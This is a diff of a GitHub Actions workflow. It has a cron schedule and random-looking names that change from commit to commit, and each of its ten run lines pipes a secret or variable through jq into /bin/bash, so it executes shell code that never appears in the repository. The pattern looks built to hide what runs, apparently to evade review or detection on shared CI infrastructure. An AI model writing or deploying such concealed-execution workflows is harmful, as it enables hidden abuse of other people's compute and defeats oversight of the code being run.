@@ -1,26 +1,27 @@
 name: fangqidong6789
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
+    - cron: '48 4/6 * * *'
 
-jobs:  # 20259
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fangqidong6789
         env:
-          gnasi46362: ${{ secrets.gnasi46362 }}
+          wofdj23: ${{ secrets.wofdj23 }}
         run: |
-          echo $gnasi46362 | jq -r .guj17 | /bin/bash
-          echo $zbfu950 | jq -r .orh6033 | /bin/bash
-          echo $gxps93 | jq -r .fapz882 | /bin/bash
-          echo $a47449 | jq -r .vth50599 | /bin/bash
-          echo $xel8 | jq -r .fmf2897 | /bin/bash
-          echo $lfnq8 | jq -r .c62646 | /bin/bash
-          echo $fu874 | jq -r .an8193 | /bin/bash
-          echo $xs2 | jq -r .spb14 | /bin/bash
-          echo $gcn76 | jq -r .ks9617 | /bin/bash
-          echo $sc2518 | jq -r .hkms4814 | /bin/bash
+          echo $wofdj23 | jq -r .nt49 | /bin/bash
+          echo $i81188 | jq -r .t46640 | /bin/bash
+          echo $g3 | jq -r .hohph94 | /bin/bash
+          echo $my80713 | jq -r .pcwxt3 | /bin/bash
+          echo $p1 | jq -r .t9216 | /bin/bash
+          echo $bqpzc6911 | jq -r .kmgy82 | /bin/bash
+          echo $p6019 | jq -r .woz3507 | /bin/bash
+          echo $i7 | jq -r .gr655 | /bin/bash
+          echo $hixyq60 | jq -r .gryrn69920 | /bin/bash
+          echo $ve3156 | jq -r .tzik3151 | /bin/bash
 
